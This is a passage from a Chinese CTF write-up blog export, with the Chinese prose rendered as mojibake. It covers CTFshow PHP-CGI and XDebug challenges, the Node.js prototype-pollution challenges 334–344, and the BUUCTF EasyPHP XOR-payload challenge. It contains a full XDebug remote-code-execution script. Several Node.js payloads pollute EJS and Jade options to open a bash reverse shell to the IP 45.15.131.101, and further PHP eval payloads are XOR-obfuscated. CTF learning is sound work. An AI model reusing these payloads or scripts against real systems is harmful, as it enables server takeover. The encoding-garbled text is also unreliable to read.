è½½php.iniæ–‡ä»¶\n> - `-d` æŒ‡å®šé…ç½®é¡¹\n> - `-b` å¯åŠ¨fastcgiè¿›ç¨‹\n> - `-s` æ˜¾ç¤ºæ–‡ä»¶æºç \n> - `-T` æ‰§è¡ŒæŒ‡å®šæ¬¡è¯¥æ–‡ä»¶\n> - `-h`å’Œ`-?` æ˜¾ç¤ºå¸®åŠ©\n\nç®€å•æ¥è¯´ï¼Œå°±å¯ä»¥é€šè¿‡å‚æ•°ä¼ é€’é€šè¿‡ä»¥ä¸Šçš„å‚æ•°ç±»å‹ä¼ å…¥ä¸åŒçš„å†…å®¹åœ¨æ‰§è¡Œphpæ—¶è¢«ä¼ å…¥\n\nå¯é€šè¿‡-dç›´æ¥ä¿®æ”¹phpä¸­çš„é…ç½®é¡¹æ¥è¾¾åˆ°æˆ‘ä»¬ä»»æ„å†™å…¥çš„æ•ˆæœ\n\n```\npayload:?-d+allow_url_include%=on+=auto_append_file=php://input\nPOST:\n<?php system('nl /somewhere/fla9.txt');?>\n```\n\n**314**\n\nåŒ…å«æ—¥å¿—æ–‡ä»¶å°±è¿‡äº†////////////\n\n**315**\n\nPHPç‰ˆæœ¬7.1.12ï¼Œdebugå¼€å¯ï¼Œç«¯å£9000\n\n> å½±å“\n>\n> XDebugæ˜¯PHPçš„ä¸€ä¸ªæ‰©å±•ï¼Œç”¨äºè°ƒè¯•PHPä»£ç ã€‚å¦‚æœç›®æ ‡å¼€å¯äº†è¿œç¨‹è°ƒè¯•æ¨¡å¼ï¼Œå¹¶è®¾ç½®remote_connect_back = 1ï¼š\n>\n> ```\n> xdebug.remote_connect_back = 1\n> xdebug.remote_enable = 1\n> ```\n>\n> è¿™ä¸ªé…ç½®ä¸‹ï¼Œæˆ‘ä»¬è®¿é—®http://target/index.php?XDEBUG_SESSION_START=phpstormï¼Œç›®æ ‡æœåŠ¡å™¨çš„XDebugå°†ä¼šè¿æ¥è®¿é—®è€…çš„IPï¼ˆæˆ–X-Forwarded-Forå¤´æŒ‡å®šçš„åœ°å€ï¼‰å¹¶é€šè¿‡dbgpåè®®ä¸å…¶é€šä¿¡ï¼Œæˆ‘ä»¬é€šè¿‡dbgpä¸­æä¾›çš„evalæ–¹æ³•å³å¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„PHPä»£ç ã€‚\n\nç¼–å†™å¥½çš„è„šæœ¬ï¼Œè¦åœ¨å…¬ç½‘IPä¸‹ä½¿ç”¨\n\n```python\n#!/usr/bin/env python3\nimport re\nimport sys\nimport time\nimport requests\nimport argparse\nimport socket\nimport base64\nimport binascii\nfrom concurrent.futures import ThreadPoolExecutor\n\n\npool = ThreadPoolExecutor(1)\nsession = requests.session()\nsession.headers = {\n    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'\n}\n\ndef recv_xml(sock):\n    blocks = []\n    data = b''\n    while True:\n        try:\n            data = data + sock.recv(1024)\n        except socket.error as e:\n            break\n        if not data:\n            break\n\n        while data:\n            eop = data.find(b'\\x00')\n            if eop < 0:\n                break\n            blocks.append(data[:eop])\n            data = data[eop+1:]\n\n        if len(blocks) >= 4:\n            break\n    \n    return blocks[3]\n\n\ndef trigger(url):\n    time.sleep(2)\n    try:\n        session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)\n    except:\n        pass\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='XDebug remote debug code execution.')\n    parser.add_argument('-c', '--code', required=True, help='the code you want to execute.')\n    parser.add_argument('-t', '--target', required=True, help='target url.')\n    parser.add_argument('-l', '--listen', default=9000, type=int, help='local port')\n    args = parser.parse_args()\n    \n    ip_port = ('0.0.0.0', args.listen)\n    sk = socket.socket()\n    sk.settimeout(10)\n    sk.bind(ip_port)\n    sk.listen(5)\n\n    pool.submit(trigger, args.target)\n    conn, addr = sk.accept()\n    conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\\x00']))\n\n    data = recv_xml(conn)\n    print('[+] Recieve data: ' + data.decode())\n    g = re.search(rb'<\\!\\[CDATA\\[([a-z0-9=\\./\\+]+)\\]\\]>', data, re.I)\n    if not g:\n        print('[-] No result...')\n        sys.exit(0)\n\n    data = g.group(1)\n\n    try:\n        print('[+] Result: ' + base64.b64decode(data).decode())\n    except binascii.Error:\n        print('[-] May be not string result...')\n```\n\nç¯å¢ƒå¯„äº†ï¼Œæ²¡å¾—ç»“æœ\n"},{"title":"Python pickleååºåˆ—åŒ–","url":"/posts/76010d11.html","content":"\n### ä»€ä¹ˆæ˜¯pickle\n\npickleæ˜¯Pythonä¸“ç”¨çš„ä¸€ä¸ªè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å·¥å…·åŒ…ï¼Œpickleèƒ½è¡¨ç¤ºPythonå‡ ä¹æ‰€æœ‰çš„ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»å‹ï¼‰ï¼Œç”±ä¸€ç³»åˆ—opcodeç»„æˆï¼Œæ¨¡æ‹Ÿäº†ç±»ä¼¼å †æ ˆçš„å†…å­˜ã€‚\n\nä¸PHPåºåˆ—åŒ–æˆ–è€…JSONï¼Œè¿™äº›ä»¥é”®å€¼å¯¹å½¢å¼å­˜å‚¨åºåˆ—åŒ–å¯¹è±¡æ•°æ®çš„ä¸åŒï¼Œpickle åºåˆ—åŒ–ï¼ˆPythonç‹¬æœ‰ï¼‰æ˜¯å°†ä¸€ä¸ª `Python å¯¹è±¡`åŠå…¶æ‰€æ‹¥æœ‰çš„å±‚æ¬¡ç»“æ„å˜æˆå¯ä»¥æŒä¹…åŒ–å‚¨å­˜çš„`äºŒè¿›åˆ¶æ•°æ®`ï¼Œæ— æ³•åƒJSON ä¸€æ ·ç›´è§‚é˜…è¯»ã€‚åœ¨Pythonä¸­ï¼Œé‡‡ç”¨æœ¯è¯­ `å°å­˜ (pickling)`å’Œ` è§£å° (unpickling)`æ¥æè¿°åºåˆ—åŒ–ã€‚\n\n#### **å¯åºåˆ—åŒ–çš„å¯¹è±¡**\n\nèŠ‚é€‰è‡ªå®˜æ–¹æ–‡æ¡£ï¼špickle â€” Python å¯¹è±¡åºåˆ—åŒ–\n\n> None, True, å’ŒFalse;\n> æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¤æ•°ï¼›\n> å­—ç¬¦ä¸²ã€å­—èŠ‚ã€å­—èŠ‚æ•°ç»„ï¼›\n> å…ƒç»„ã€åˆ—è¡¨ã€é›†åˆå’Œä»…åŒ…å«å¯æå–å¯¹è±¡çš„å­—å…¸ï¼›\n> åœ¨æ¨¡å—é¡¶å±‚å®šä¹‰çš„å‡½æ•°ï¼ˆå†…ç½®çš„å’Œç”¨æˆ·å®šä¹‰çš„ï¼‰ï¼ˆä½¿ç”¨defï¼Œä¸æ˜¯lambdaï¼‰ï¼›\n> åœ¨æ¨¡å—é¡¶å±‚å®šä¹‰çš„ç±»ï¼›\n> æŸäº›ç±»å®ä¾‹ï¼Œè¿™äº›ç±»çš„ `__dict__ `å±æ€§å€¼æˆ–` __getstate__()` å‡½æ•°çš„è¿”å›å€¼å¯ä»¥è¢«å°å­˜ï¼ˆè¯¦æƒ…å‚é˜… å°å­˜ç±»å®ä¾‹ è¿™ä¸€æ®µï¼‰ã€‚\n\n#### æ‰‹æ“opcode\n"},{"title":"CTFshowNodejs","url":"/posts/56040919.html","content":"\n# nodejs\n\né¦–å…ˆè¦çŸ¥é“nodejsæ˜¯å•¥ï¼Œå…¶å®å°±æ˜¯javascriptçš„åç«¯ç‰ˆæœ¬\n\nä¸€äº›æœ‰çš„æ²¡çš„çš„å…¥é—¨çŸ¥è¯†\n\n[nodejsä¸€äº›å…¥é—¨ç‰¹æ€§&&å®æˆ˜](https://xz.aliyun.com/t/7752#toc-5)\n\n**nodejsè°ƒç”¨ç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼**\n\nå¦‚æœä½ è¦æ˜¯ä½¿ç”¨nodejsï¼Œä½ éœ€è¦è°ƒç”¨å¼•ç”¨`child_process`æ¨¡å—ï¼š\n\n```js\nvar exec = require('child_process').exec;\nvar cmd = 'prince -v builds/pdf/book.html -o builds/pdf/book.pdf';\n\nexec(cmd, function(error, stdout, stderr) {\n  // è·å–å‘½ä»¤æ‰§è¡Œçš„è¾“å‡º\n});\n```\n\nè¿™é‡Œä½¿ç”¨çš„æ˜¯`child_process.exec`æ¥åœ¨nodejsç¨‹åºé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚å¦‚æœä½ æƒ³åœ¨shellé‡Œæ‰§è¡Œå‘½ä»¤å¹¶ä¸”è¦å¤„ç†å‘½ä»¤è¾“å‡ºçš„I/Oæ•°æ®æµï¼Œè¾“å‡ºçš„ä½“ç§¯æ¯”è¾ƒå¤§çš„è¯ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨`child_process.spawn`ï¼š\n\n```js\nvar spawn = require('child_process').spawn;\nvar child = spawn('prince', [\n  '-v', 'builds/pdf/book.html',\n  '-o', 'builds/pdf/book.pdf'\n]);\n\nchild.stdout.on('data', function(chunk) {\n  // output will be here in chunks\n});\n\n// or if you want to send output elsewhere\nchild.stdout.pipe(dest);\n```\n\nå¦‚æœä½ æƒ³åœ¨nodejsé‡Œæ‰§è¡Œçš„æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªç®€å•çš„å‘½ä»¤ï¼Œé‚£ä½ å°±éœ€è¦ä½¿ç”¨`child_process.execFile`ï¼Œè¿™ä¸ªæ–¹æ³•çš„å‚æ•°å‡ ä¹å’Œ`spawn`ä¸€æ ·ï¼Œåªæ˜¯å¤šäº†ç¬¬å››ä¸ªå›è°ƒå‡½æ•°å‚æ•°ï¼Œå’Œ`exec`é‡Œçš„å›è°ƒå‡½æ•°å‚æ•°ä¸€æ ·ï¼š\n\n```js\nvar execFile = require('child_process').execFile;\nexecFile(file, args, options, function(error, stdout, stderr) {\n  // command output is in stdout\n});\n```\n\nä¸Šé¢çš„è¿™äº›æ–¹æ³•åœ¨nodejsé‡Œéƒ½æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ï¼Œåˆ°ä½†æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦åŒæ­¥æ‰§è¡Œä¸€äº›ä»»åŠ¡ï¼Œä¸‹é¢çš„ä¸€äº›ä»£ç ä¾‹å­æ˜¯ä½¿ç”¨åŒæ­¥çš„æ–¹æ³•è°ƒç”¨ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œä»»åŠ¡ï¼š\n\n```js\n'use strict';\n\nconst\n    spawn = require( 'child_process' ).spawnSync,\n    ls = spawn( 'ls', [ '-lh', '/usr' ] );\n\nconsole.log( `stderr: ${ls.stderr.toString()}` );\nconsole.log( `stdout: ${ls.stdout.toString()}` );\nconst execSync = require('child_process').execSync;\n\nvar cmd = execSync('prince -v builds/pdf/book.html -o builds/pdf/book.pdf');\n```\n\nç®€å•æ¥è¯´ï¼Œè°ƒç”¨ç³»ç»Ÿå‘½ä»¤ä¼ å…¥çš„æ–¹æ³•æ˜¯\n\n\n\nåœ¨JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ`__proto__`ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†object2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚\n\n\n\n\n\n\n\n\n\n**334**\n\n```javascript\nvar findUser = function(name, password){\n  return users.find(function(item){\n    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;\n  });\n};\n```\n\nç›´æ¥å°å†™å°±è¡Œ`ctfshow+123456`\n\n**335**\n\nçœ‹æºä»£ç å‘ç°evalå‚æ•°ï¼Œå°è¯•ä¼ å…¥lså›æ˜¾æœªæ‰¾åˆ°æ–‡ä»¶ï¼Œä¼ å…¥1+1å›æ˜¾2ï¼Œæ€€ç–‘æ‰§è¡Œäº†nodejsä¸­çš„evalå‡½æ•°\n\n> åœ¨nodejsä¸­ï¼Œeval()æ–¹æ³•ç”¨äºè®¡ç®—å­—ç¬¦ä¸²ï¼Œå¹¶æŠŠå®ƒä½œä¸ºè„šæœ¬ä»£ç æ¥æ‰§è¡Œï¼Œè¯­æ³•ä¸ºâ€œeval(string)â€ï¼›å¦‚æœå‚æ•°ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯æ•´æ•°æˆ–è€…æ˜¯Functionç±»å‹ï¼Œåˆ™ç›´æ¥è¿”å›è¯¥æ•´æ•°æˆ–Functionã€‚\n\næ„é€ ä¸€ä¸ªç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„payload\n\n```javascript\nrequire(\"child_process\").execSync('ls')\n```\n\næ‹¿åˆ°æ–‡ä»¶åç›´æ¥catå°±è¡Œ\n\n**336**\n\nåŒä¸Šé¢˜ä¸è¿‡å¢åŠ äº†è¿‡æ»¤\n\næ¢ä¸€ä¸ªæ–¹æ³•\n\n```javascript\nrequire('child_process').spawnSync('ls', []).stdout.toString()\n```\n\n**337**\n\næºç åœ¨æ­¤\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\nvar crypto = require('crypto');\n\nfunction md5(s) {\n  return crypto.createHash('md5')\n    .update(s)\n    .digest('hex');\n}\n\n/* GET home page. */\nrouter.get('/', function(req, res, next) {\n  res.type('html');\n  var flag='xxxxxxx';\n  var a = req.query.a;\n  var b = req.query.b;\n  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){\n  \tres.end(flag);\n  }else{\n  \tres.render('index',{ msg: 'tql'});\n  }\n  \n});\n\nmodule.exports = router;\n```\n\nè¦æ±‚å°±æ˜¯ä¼ å…¥çš„abé•¿åº¦ç›¸ç­‰ï¼Œå†…å®¹ä¸æƒ³ç­‰ï¼ŒåŠ ä¸Šflagå­—ç¬¦ä¸²å˜é‡åmd5è¿ç®—çš„ç»“æœç›¸åŒ\n\n> åœ¨javascriptä¸­åŠ æ³•çš„è§„åˆ™å¾ˆç®€å•ï¼Œåªèƒ½æ•°å­—ä¸æ•°å­—ç›¸åŠ æˆ–å­—ç¬¦ä¸²å’Œå­—ç¬¦ä¸²ç›¸åŠ ï¼›æ‰€æœ‰å…¶ä»–ç±»å‹çš„å€¼éƒ½ä¼šè‡ªåŠ¨è½¬æ¢æˆè¿™ä¸¤ä¸ªç±»å‹çš„å€¼ã€‚è€Œå¯¹è±¡ç±»å‹ç»è¿‡toStringè½¬æ¢åç»“æœä¸º[object Object]å­—ç¬¦ä¸²\n\næ‰€ä»¥æœ€ç»ˆä¼ å…¥ä¸¤ä¸ªæ•°ç»„å³å¯\n\n```\npayload:?a[x]=1&b[x]=2\n```\n\nä¸ºå•¥æ•°ç»„çš„é”®å€¼ä¸èƒ½æ˜¯æ•°å­—\n\n```\na={'x':'1'}\nb={'x':'2'}\n\nconsole.log(a+\"flag{xxx}\")\nconsole.log(b+\"flag{xxx}\")\näºŒè€…å¾—å‡ºçš„ç»“æœéƒ½æ˜¯[object Object]flag{xxx}ï¼Œæ‰€ä»¥md5å€¼ä¹Ÿç›¸åŒ\n\nä½†æ˜¯å¦‚æœä¼ a[0]=1&b[0]=2ï¼Œç›¸å½“äºåˆ›äº†ä¸ªå˜é‡a=[1] b=[2]ï¼Œå†åƒä¸Šé¢é‚£æ ·æ‰“å°çš„æ—¶å€™ï¼Œä¼šæ‰“å°å‡º1flag{xxx}å’Œ2flag{xxx}\n```\n\n**338**\n\nåŸå‹é“¾æ±¡æŸ“\n\n```javascript\n//login.js\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var secert = {};\n  var sess = req.session;\n  let user = {};\n  utils.copy(user,req.body);\n  if(secert.ctfshow==='36dboy'){\n    res.end(flag);\n  }else{\n    return res.json({ret_code: 2, ret_msg: 'ç™»å½•å¤±è´¥'+JSON.stringify(user)});  \n  }\n});\nmodule.exports = router;\n```\n\n`utils.copy(user,req.body);`è¿™ä¸ªå’Œmergeå·®ä¸å¤š\n\n```\npayload:\nPOST\n{\"__proto__\":{\"ctfshow\":\"36dboy\"}}\n```\n\n**339**\n\n```javascript\n//login.js\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n\nfunction User(){\n  this.username='';\n  this.password='';\n}\nfunction normalUser(){\n  this.user\n}\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var secert = {};\n  var sess = req.session;\n  let user = {};\n  utils.copy(user,req.body);\n  if(secert.ctfshow===flag){\n    res.end(flag);\n  }else{\n    return res.json({ret_code: 2, ret_msg: 'ç™»å½•å¤±è´¥'+JSON.stringify(user)});  \n  }\n});\nmodule.exports = router;\n```\n\nè¿™è¦è®©ctfshow=flagå˜é‡ï¼Œæˆ‘ä¸è¡Œæï¼Œçœ‹çœ‹æ—è¾¹çš„app.js\n\n```javascript\n//api.js\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  res.render('api', { query: Function(query)(query)});\n});\nmodule.exports = router;\n```\n\n- Function(\"console.log('HelloWolrd')\")()\n\nç±»ä¼¼äºphpä¸­çš„create_function\n\nå¯¹äºejsæ¸²æŸ“å¼•æ“æ¥è¯´ï¼Œå¯¹optsæœ‰åŸå‹é“¾æ±¡æŸ“æ¼æ´\n\n```javascript\nif (opts.outputFunctionName) {\n        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\\n';\n}\n```\n\nè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥æ±¡æŸ“outputFunctionNameæ¥æ‰§è¡Œæ¶æ„ä»£ç \n\n```js\n{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"');var __tmp2\"}}\n```\n\né€šè¿‡loginæ±¡æŸ“å†é€šè¿‡apiæ¸²æŸ“è°ƒç”¨\n\n**340**\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var user = new function(){\n    this.userinfo = new function(){\n    this.isVIP = false;\n    this.isAdmin = false;\n    this.isAuthor = false;     \n    };\n  }\n  utils.copy(user.userinfo,req.body);\n  if(user.userinfo.isAdmin){\n   res.end(flag);\n  }else{\n   return res.json({ret_code: 2, ret_msg: 'ç™»å½•å¤±è´¥'});  \n  }\n});\nmodule.exports = router;\n```\n\nè¿™é‡Œè¦å‘ä¸Šæ±¡æŸ“ä¸¤å±‚æ‰è¡Œï¼Œå…¶ä»–çš„éƒ½å’Œä¸Šé¢ä¸€æ ·\n\n```json\n{\"__proto__\":{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"');var __tmp2\"}}}\n```\n\n**341**\n\næ²¡æœ‰apiäº†ï¼Œç›´æ¥ejsçš„rce\n\n```json\n{\"__proto__\":{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"');var __tmp2\"}}}\n```\n\n**342ï¼Œ343**\n\nä¸æ˜¯ejsæ¸²æŸ“æ¨¡ç‰ˆäº†\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205282335944.png)\n\næ˜¯jadeæ¸²æŸ“æ¨¡ç‰ˆï¼Œæ‰¾jadeçš„åŸå‹é“¾æ±¡æŸ“rce\n\n```json\n{\"__proto__\":{\"__proto__\": {\"type\":\"Block\",\"nodes\":\"\",\"compileDebug\":1,\"self\":1,\"line\":\"global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"')\"}}}\n```\n\n**344**\n\næºç \n\n```javascript\nrouter.get('/', function(req, res, next) {\n  res.type('html');\n  var flag = 'flag_here';\n  if(req.url.match(/8c|2c|\\,/ig)){\n  \tres.end('where is flag :)');\n  }\n  var query = JSON.parse(req.query.query);\n  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){\n  \tres.end(flag);\n  }else{\n  \tres.end('where is flag. :)');\n  }\n});\n```\n\næ ¹æ®æºç æˆ‘ä»¬æ­£å¸¸æƒ…å†µä¸‹éœ€è¦ä¼ `?query={\"name\":\"admin\",\"password\":\"ctfshow\",\"isVIP\":true}`ä½†æ˜¯é¢˜ç›®æŠŠé€—å·å’Œä»–çš„urlç¼–ç ç»™è¿‡æ»¤æ‰äº†ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡ã€‚\n\n```\npayload:?query={\"name\":\"admin\"&query=\"password\":\"%63tfshow\"&query=\"isVIP\":true}\n```\n\nnodejsä¸­ä¼šæŠŠè¿™ä¸‰éƒ¨åˆ†æ‹¼æ¥èµ·æ¥ï¼Œä¸ºä»€ä¹ˆæŠŠctfshowä¸­çš„cç¼–ç å‘¢ï¼Œå› ä¸ºåŒå¼•å·çš„urlç¼–ç æ˜¯%22å†å’Œcè¿æ¥èµ·æ¥å°±æ˜¯%22cï¼Œä¼šåŒ¹é…åˆ°æ­£åˆ™è¡¨è¾¾å¼ã€‚\n"},{"title":"BUUCTFè®°å½•2","url":"/posts/210d3ac7.html","content":"\nBUUç¬¬äºŒä»½\n\n<!--more -->\n\n## [ISITDTU 2019]EasyPHP\n\n```php\n<?php\nhighlight_file(__FILE__);\n\n$_ = @$_GET['_'];\nif ( preg_match('/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i', $_) )\n    die('rosÃ© will not do it');\n\nif ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )\n    die('you are so close, omg');\n\neval($_);\n?>\n```\n\n`strlen(count_chars(strtolower($_), 0x3)) > 0xd`\n\nå…ˆçœ‹è¿™ä¸ªåˆ¤æ–­ï¼Œcount_charså‡½æ•°ç”¨æ³•å¦‚ä¸‹\n\n| å‚æ•°     | æè¿°                                                         |\n| :------- | :----------------------------------------------------------- |\n| *string* | å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚                                   |\n| *mode*   | å¯é€‰ã€‚è§„å®šè¿”å›æ¨¡å¼ã€‚é»˜è®¤æ˜¯ 0ã€‚æœ‰ä»¥ä¸‹ä¸åŒçš„è¿”å›æ¨¡å¼ï¼š<br />0 - æ•°ç»„ï¼ŒASCII å€¼ä¸ºé”®åï¼Œå‡ºç°çš„æ¬¡æ•°ä¸ºé”®å€¼1 - æ•°ç»„ï¼ŒASCII å€¼ä¸ºé”®åï¼Œå‡ºç°çš„æ¬¡æ•°ä¸ºé”®å€¼ï¼Œåªåˆ—å‡ºå‡ºç°æ¬¡æ•°å¤§äº 0 çš„å€¼<br />2 - æ•°ç»„ï¼ŒASCII å€¼ä¸ºé”®åï¼Œå‡ºç°çš„æ¬¡æ•°ä¸ºé”®å€¼ï¼Œåªåˆ—å‡ºå‡ºç°æ¬¡æ•°ç­‰äº 0 çš„å€¼<br />3 - å­—ç¬¦ä¸²ï¼Œå¸¦æœ‰æ‰€æœ‰ä½¿ç”¨è¿‡çš„ä¸åŒçš„å­—ç¬¦<br />4 - å­—ç¬¦ä¸²ï¼Œå¸¦æœ‰æ‰€æœ‰æœªä½¿ç”¨è¿‡çš„ä¸åŒçš„å­—ç¬¦ |\n\né‚£ä¹ˆä¸Šè¿°åˆ¤æ–­æ¡ä»¶å°±æ˜¯è¦ä¿è¯ä¼ å…¥çš„æ•°æ®ä¸­æœ‰ä¸å¤šäº13ä¸­ä¸åŒçš„å­—ç¬¦ï¼Œå…ˆä½¿ç”¨phpinfoæŸ¥çœ‹ä¿¡æ¯\n\n```\n?.=(~%8F%97%8F%96%91%99%90)();\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-26 15.30.06.png)\n\nå¯ä»¥ä½¿ç”¨scandiræ¥æ‰«ææ–‡ä»¶ï¼Œæ„å»ºpayloadï¼š`print_r(scandir('.'))`\n\nä½¿ç”¨å¼‚æˆ–è„šæœ¬ç”Ÿæˆ\n\n```python\nstr=\"print_r\"\nfor i in str:\n    print(hex(int(hex(ord(i)),16) ^ 0xff),end='')\n```\n\nç”Ÿæˆçš„payloadå¦‚ä¸‹\n\n```\n?.=((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%d1)^(%ff)))); \n```\n\nä½†æ˜¯æ­¤æ—¶æˆ‘ä»¬å‘ç°è¶…è¿‡äº†13ä¸ªä¸åŒå­—ç¬¦çš„é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡å¼‚æˆ–ç¼©å‡åŸå§‹å­—ç¬¦æ•°é‡\n\n```python\nnow ='\\'().;_acdinprst'\nfor i in now :\n    for j in now:\n        for k in now :\n            for m in now :\n                if ord(j)^ord(k)^ord(m) == ord(i):\n                    if(j==k or j==m or m==k ):\n                        continue\n                    else :\n                        print(i+'=='+j + '^'+ k +'^'+m)\n```\n\nç»“æœä¸­å¯ä¾›æ›¿æ¢çš„å­—ç¬¦æœ‰å¾ˆå¤šï¼ŒæŒ‘å‡ºä¸‰ä¸ªå¥½ç”¨çš„\n\n```\nt = s^c^d\ns^0xff=0x8c\nc^0xff=0x9c \nd^0xff=0x9b\nn = i^c^d\ni^0xff=0x96\nc^0xff=0x9c\nd^0xff=0x9b\nr = a^c^p\na^0xff=0x9e\nc^0xff=0x9c\np^0xff=0x8f\n```\n\næœ€ç»ˆå¼‚æˆ–æ—¶å€™å°†ä¸éœ€è¦å¼‚æˆ–çš„å­—ç¬¦ä¸²å¼‚æˆ–0xFFä¸¤æ¬¡å³å¯\n\n```\nprint_r=((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))\nscandir=((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))\næœ€ç»ˆpayloadï¼š?.=((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))((%d1)^(%ff)));\n```\n\nè·å¾—æ–‡ä»¶åï¼Œå°è¯•è®¿é—®å‘ç°æ²¡æœ‰æƒé™ï¼Œåªèƒ½ä½¿ç”¨å‡½æ•°è¯»å–`readfile(end(scandir('.')))`\n\n```\nArray ( [0] => . [1] => .. [2] => index.php [3] => n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )\n```\n\nçœŸÂ·æœ€ç»ˆpayload\n\n```\n?.=((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF)));\n```\n\n## [GYCTF2020]Ez_Express\n\næœ¬é¢˜è§¦åŠçŸ¥è¯†ç›²åŒºï¼Œä¹–ä¹–å­¦ä¹ node.jså»å’¯\n\né¦–å…ˆè¿˜æ˜¯è¦äº†è§£ä¸€ä¸‹node.jsï¼Œé€šä¿—æ„ä¹‰ä¸Šç†è§£å°±æ˜¯javascriptçš„åç«¯ç‰ˆæœ¬ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šè¯­æ³•æ˜¯å’Œjavascriptä¸€æ ·çš„ï¼Œè¿™é‡Œè´´ä¸ªå¤§ä½¬çš„[node.jsç›¸å…³å®‰å…¨é—®é¢˜æ€»ç»“](https://www.cnblogs.com/20175211lyz/p/12659738.html)ï¼Œç„¶åå°±æ˜¯è¿™é“é¢˜äº†ï¼Œæ˜¯node.jsçš„åŸå‹é“¾æ±¡æŸ“\n\n**node.jsçš„åŸå‹é“¾æ±¡æŸ“**\n\nåœ¨jsä¸­ä¸‡ç‰©çš†å¯¹è±¡ï¼Œè€Œåœ¨jsæˆ‘ä»¬å¦‚æœæƒ³è¦å®šä¹‰ä¸€ä¸ªç±»çš„è¯å°±éœ€è¦ä½¿ç”¨ç±»ä¼¼äºæ„é€ å‡½æ•°çš„æ–¹å¼æ¥æ„é€ \n\n```javascript\nfunction Foo() {\n    this.bar = 1\n}\nnew Foo()\n```\n\nç±»ä¸­çš„æ–¹æ³•ä¹ŸåŒæ ·å¯ä»¥å†™åœ¨æ„é€ å‡½æ•°å†…\n\n```javascript\nfunction Foo() {\n    this.bar = 1\n    this.show = function() {\n        